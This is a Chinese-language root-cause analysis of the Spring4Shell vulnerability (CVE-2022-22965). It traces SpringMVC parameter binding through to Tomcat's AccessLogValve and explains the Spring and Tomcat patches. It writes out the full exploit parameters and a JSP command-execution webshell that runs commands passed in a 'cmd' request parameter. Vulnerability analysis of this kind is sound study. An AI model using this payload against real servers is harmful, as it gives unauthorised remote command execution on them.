### 漏洞名称

Spring CVE-2022-22965



### 漏洞利用关键点

**关键点一：Tomcat Web应用部署方式**

应用以war包部署到Tomcat中时使用到

**关键点二：JDK版本大于等于9**

**关键点三：SpringMVC参数绑定**



### 原理

通过请求传入的参数，利用SpringMVC参数绑定机制，控制了Tomcat AccessLogValve的属性，

让Tomcat在webapps/ROOT目录输出定制的 “ 访问日志” tomcatwar.jsp，“该访问日志” 实际上为一个 JSP webshell

通过   http://localhost:8080/tomcatwar.jsp 访问

触发   JSP webshell



### 前置知识

#### SpringMVC参数绑定

SpringMVC支持多层嵌套的参数绑定，多层嵌套通过点（ department.name ）的形式绑定

当请求为 ：/addUser?name=test&department.name=SEC时

可以看到name自动绑定到了user参数的name属性上，department.name自动绑定到了user参数的department属性的name属性上

实际上department.name的绑定是Spring通过如下的调用链实现的：

```java
User.getDepartment()
    Department.setName()
```

假设请求参数名为foo.bar.baz.qux，对应Controller方法入参为Param，则有以下的调用链：

```java
Param.getFoo()
    Foo.getBar()
        Bar.getBaz()
            Baz.setQux() // 注意这里为set
```



```java
package com.qin.cve.controller;

import com.qin.cve.entry.User;
import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.*;

@Slf4j
@RestController
public class UserController {

    @GetMapping("/addUser")
    public String addUser(User user) {
        log.warn("User : {}", user.toString());
        return "OK";
    }
}

```

```java
package com.qin.cve.entry;

import lombok.Data;

@Data
public class User {

    private String name;
    private Department department;

}

```

```java
package com.qin.cve.entry;

import lombok.Data;

@Data
public class Department {

    private String name;
}

```

调用过程

主要方法WebDataBinder.doBind(MutablePropertyValues)

```java
	@Override
	protected void doBind(MutablePropertyValues mpvs) {
		checkFieldDefaults(mpvs);
		checkFieldMarkers(mpvs);
		adaptEmptyArrayIndices(mpvs);
		super.doBind(mpvs);
	}
```



![](img\2023-04-18-154848.jpg)

经过一系列的调用逻辑后，我们来到AbstractNestablePropertyAccessor.getPropertyAccessorForPropertyPath(String)方法。该方法通过递归调用自身，实现对class.module.classLoader.resources.context.parent.pipeline.first.pattern的递归解析，设置整个调用链。

```java
	@Override
	public void setPropertyValue(String propertyName, @Nullable Object value) throws BeansException {
		AbstractNestablePropertyAccessor nestedPa;
		try {
			nestedPa = getPropertyAccessorForPropertyPath(propertyName);
		}
		catch (NotReadablePropertyException ex) {
			throw new NotWritablePropertyException(getRootClass(), this.nestedPath + propertyName,
					"Nested property in path '" + propertyName + "' does not exist", ex);
		}
		PropertyTokenHolder tokens = getPropertyNameTokens(getFinalPath(nestedPa, propertyName));
		nestedPa.setPropertyValue(tokens, new PropertyValue(propertyName, value));
	}

	protected AbstractNestablePropertyAccessor getPropertyAccessorForPropertyPath(String propertyPath) {
		int pos = PropertyAccessorUtils.getFirstNestedPropertySeparatorIndex(propertyPath);
		// Handle nested properties recursively.
		if (pos > -1) {
			String nestedProperty = propertyPath.substring(0, pos);
			String nestedPath = propertyPath.substring(pos + 1);
			AbstractNestablePropertyAccessor nestedPa = getNestedPropertyAccessor(nestedProperty);
			return nestedPa.getPropertyAccessorForPropertyPath(nestedPath);
		}
		else {
			return this;
		}
	}
```

![](img\2023-04-18-154849.jpg)

![](img\2023-04-18-154850.jpg)



**第一轮迭代**

进入

getPropertyAccessorForPropertyPath(String)

方法前：

· this：User的BeanWrapperImpl包装实例

·propertyPath：class.module.classLoader.resources.context.parent.pipeline.first.pattern

·nestedPath：module.classLoader.resources.context.parent.pipeline.first.pattern

·nestedProperty：class，即本轮迭代需要解析的嵌套参数

![](img\2023-04-18-154851.jpg)

进入方法，经过一系列的调用逻辑后，最终来到BeanWrapperImpl，BeanPropertyHandler.getValue()方法中。可以看到class嵌套参数最终通过反射调用User的父类java.lang.Object.getClass()，获得返回java.lang.Class实例。

![](img\2023-04-18-154852.jpg)

拿到Class

![](img\2023-04-18-154853.jpg)

经过第一轮迭代，我们可以得出第一层调用链：

```java
User.getClass()
    java.lang.Class.get???() // 下一轮迭代实现
```

**第二轮迭代**

```java
User.getClass()
    java.lang.Class.getModule()
        java.lang.Module.get???() // 下一轮迭代实现
```

**第三轮迭代**

```java
User.getClass()
    java.lang.Class.getModule()
        java.lang.Module.getClassLoader()
            org.apache.catalina.loader.ParallelWebappClassLoader.get???() // 下一轮迭代实现
```

依次调试剩余的递归轮次并观察相应的变量，最终可以得到如下完整的调用链：

```java
User.getClass()
    java.lang.Class.getModule()
        java.lang.Module.getClassLoader()
            org.apache.catalina.loader.ParallelWebappClassLoader.getResources()
                org.apache.catalina.webresources.StandardRoot.getContext()
                    org.apache.catalina.core.StandardContext.getParent()
                        org.apache.catalina.core.StandardHost.getPipeline()
                            org.apache.catalina.core.StandardPipeline.getFirst()
                                org.apache.catalina.valves.AccessLogValve.setPattern()
```



#### **Spring 5.3.18补丁**

通过对比Spring 5.3.17和5.3.18的版本，可以看到在3月31日有一项名为“Redefine PropertyDescriptor filter的”提交。

![](img\20210411221101.png)

进入该提交，可以看到对CachedIntrospectionResults构造函数中Java Bean的PropertyDescriptor的过滤条件被修改了：当Java Bean的类型为java.lang.Class时，仅允许获取name以及Name后缀的属性描述符。

关键点二：JDK版本中，利用java.lang.Class.getModule()的链路就走不通了。

![](img\20210411221102.png)



#### Java Bean PropertyDescriptor

PropertyDescriptor是JDK自带的java.beans包下的类，意为属性描述器，用于获取符合Java Bean规范的对象属性和get/set方法。

PropertyDescriptor实际上就是Java Bean的属性和对应get/set方法的集合

```java
package com.qin.cve;

import com.qin.cve.entry.User;

import java.beans.BeanInfo;
import java.beans.IntrospectionException;
import java.beans.Introspector;
import java.beans.PropertyDescriptor;
import java.lang.reflect.InvocationTargetException;

public class PropertyDescriptorDemo {

    public static void main(String[] args) throws IntrospectionException, InvocationTargetException, IllegalAccessException {
        User user = new User();
        user.setName("foo");
        //JDK 自带的 Bean信息
        BeanInfo userBeanInfo = Introspector.getBeanInfo(User.class);
        //PropertyDescriptor实际上就是Java Bean的属性和对应get/set方法的集合
        PropertyDescriptor[] descriptors = userBeanInfo.getPropertyDescriptors();

        PropertyDescriptor userNameDescriptor = null;
        for (PropertyDescriptor descriptor : descriptors) {
            if (descriptor.getName().equals("name")) {

                userNameDescriptor = descriptor;
                //  user 对应的 getName() 和 setName
                System.out.println("userNameDescriptor: " + userNameDescriptor);
                System.out.println("Before modification: ");
                // 执行 user.getName()
                System.out.println("user.name: " + userNameDescriptor.getReadMethod().invoke(user));
                // 执行 user.setName()
                userNameDescriptor.getWriteMethod().invoke(user, "bar");
            }
        }
        System.out.println("After modification: ");
        // 执行 user.getName()
        System.out.println("user.name: " + userNameDescriptor.getReadMethod().invoke(user));
        System.out.println("user.name: " + user);
    }
}

```



#### Spring BeanWrapperImpl

在Spring中，BeanWrapper接口是对Bean的包装，定义了大量可以非常方便的方法对Bean的属性进行访问和设置

BeanWrapperImpl类是BeanWrapper接口的默认实现，BeanWrapperImpl.wrappedObject属性即为被包装的Bean对象，BeanWrapperImpl对Bean的属性访问和设置最终调用的是PropertyDescriptor

```java
package com.qin.cve;

import com.qin.cve.entry.Department;
import com.qin.cve.entry.User;
import org.springframework.beans.BeanWrapper;
import org.springframework.beans.BeanWrapperImpl;

public class BeanWrapperDemo {

    public static void main(String[] args) {

        User user = new User();
        user.setName("foo");
        Department department = new Department();
        department.setName("SEC");
        user.setDepartment(department);

        BeanWrapper userBeanWrapper = new BeanWrapperImpl(user);
        userBeanWrapper.setAutoGrowNestedPaths(true);
        System.out.println("userBeanWrapper: " + userBeanWrapper);

        System.out.println("Before modification: ");
        System.out.println("user.name: " + userBeanWrapper.getPropertyValue("name"));
        System.out.println("user.department.name: " + userBeanWrapper.getPropertyValue("department.name"));

        userBeanWrapper.setPropertyValue("name", "bar");
        userBeanWrapper.setPropertyValue("department.name", "IT");

        System.out.println("After modification: ");
        System.out.println("user.name: " + userBeanWrapper.getPropertyValue("name"));
        System.out.println("user.department.name: " + userBeanWrapper.getPropertyValue("department.name"));
    }
}

```

通过BeanWrapperImpl可以很方便地访问和设置Bean的属性，比直接使用PropertyDescriptor要简单很多





#### Tomcat AccessLogValve 和 access_log

Tomcat的Valve用于处理请求和响应，通过组合了多个Valve的Pipeline，来实现按次序对请求和响应进行一系列的处理。其中AccessLogValve用来记录访问日志access_log。Tomcat 的 server.xml中默认配置了AccessLogValve，所有部署在Tomcat中的Web应用均会执行该Valve，内容如下：

```xml
<!-- Tomcat 的 server.xml  -->
<Valve className="org.apache.catalina.valves.AccessLogValve" directory="logs"
               prefix="localhost_access_log" suffix=".txt"
               pattern="%h %l %u %t &quot;%r&quot; %s %b" />
```

下面列出配置中出现的几个重要属性：

· directory：access_log文件输出目录。

· prefix：access_log文件名前缀。

· pattern：access_log文件内容格式。

· suffix：access_log文件名后缀。

· fileDateFormat：access_log文件名日期后缀，默认为.yyyy-MM-dd。





##### pattern参数

参数名：class.module.classLoader.resources.context.parent.pipeline.first.pattern

参数值：

```java
%{c2}i if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i
```

SpringMVC多层嵌套参数绑定最终可以得到如下完整的调用链：

```java
User.getClass()
    java.lang.Class.getModule()
        java.lang.Module.getClassLoader()
            org.apache.catalina.loader.ParallelWebappClassLoader.getResources()
                org.apache.catalina.webresources.StandardRoot.getContext()
                    org.apache.catalina.core.StandardContext.getParent()
                        org.apache.catalina.core.StandardHost.getPipeline()
                            org.apache.catalina.core.StandardPipeline.getFirst()
                                org.apache.catalina.valves.AccessLogValve.setPattern()
```

AccessLogValve的父类AbstractAccessLogValve

AccessLogValve输出的日志中可以通过形如   %{xxx}i   等形式会直接引用HTTP请求和响应中的内容。

![](img\2023-04-18-154854.jpg)

headers变量内容：

```json
headers = {
    "suffix":"%>//",
    "c1":"Runtime",
    "c2":"<%",
    "DNT":"1",
    "Content-Type":"application/x-www-form-urlencoded"
}
```

就是 ： 

%{c2}i           日志输出  http 内容   <% 

%{c1}i           日志输出  http 内容   Runtime

%{suffix}i     日志输出  http 内容   %>//



参数值：

```java
%{c2}i 
    if("j".equals(request.getParameter("pwd"))){ 
        java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); 
        int a = -1; 
        byte[] b = new byte[2048]; 
        while((a=in.read(b))!=-1){ 
            out.println(new String(b)); 
        } 
    } 
%{suffix}i
```

参数值模板传参对应上面的对应日志输出：

```java
<%
if("j".equals(request.getParameter("pwd"))){
  java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
  int a = -1;
  byte[] b = new byte[2048];
  while((a=in.read(b))!=-1){
    out.println(new String(b));
  }
}
%>//
```

这是一个JSP webshell



##### suffix参数

参数名：

class.module.classLoader.resources.context.parent.pipeline.first.suffix

参数值：.jsp

按照pattern参数相同的调试方法，suffix参数最终将AccessLogValve.suffix设置为.jsp，即access_log的文件名后缀。





##### directory参数

参数名：class.module.classLoader.resources.context.parent.pipeline.first.directory

参数值：webapps/ROOT

按照pattern参数相同的调试方法，directory参数最终将AccessLogValve.directory设置为webapps/ROOT，即access_log的文件输出目录。

这里提下webapps/ROOT目录，该目录为Tomcat Web应用根目录。部署到目录下的Web应用，可以直接通过http://localhost:8080/根目录访问。



#####  prefix参数

参数名：class.module.classLoader.resources.context.parent.pipeline.first.prefix

参数值：tomcatwar

按照pattern参数相同的调试方法，prefix参数最终将AccessLogValve.prefix设置为tomcatwar，即access_log的文件名前缀。



##### fileDateFormat参数

参数名：class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat

参数值：空

按照pattern参数相同的调试方法，fileDateFormat参数最终将AccessLogValve.fileDateFormat设置为空，即access_log的文件名不包含日期。



#### 总结

经过上述的分析，结论非常清晰了：

通过请求传入的参数，利用SpringMVC参数绑定机制，控制了Tomcat AccessLogValve的属性，

让Tomcat在webapps/ROOT目录输出定制的 **访问日志** tomcatwar.jsp，该  **访问日志**  实际上为一个JSP webshell



通过   http://localhost:8080/tomcatwar.jsp 访问

触发   JSP webshell



#### **Tomcat 9.0.62补丁**

通过对比Tomcat 9.0.61和9.0.62的版本，可以看到在4月1日有一项名为“Security hardening. Deprecate getResources() and always return null.”提交。

![](img\20210411221103.png)

进入该提交，可以看到对getResources()方法的返回值做了修改，直接返回null。

WebappClassLoaderBase即ParallelWebappClassLoader的父类

关键点一：Web应用部署方式中，利用org.apache.catalina.loader.ParallelWebappClassLoader.getResources()的链路就走不通了。


![](img\20210411221104.png)





### Tomcat 知识

createStartDigester：创建对应的文件解析器（包含指定的解析规则），用于后面解析server.xml文件

pipe列表：pipe 调用很多Valve ，ValveBase

AccessLogValve ： 就是一个 Valve  

![](img\2023-04-18-154847.jpg)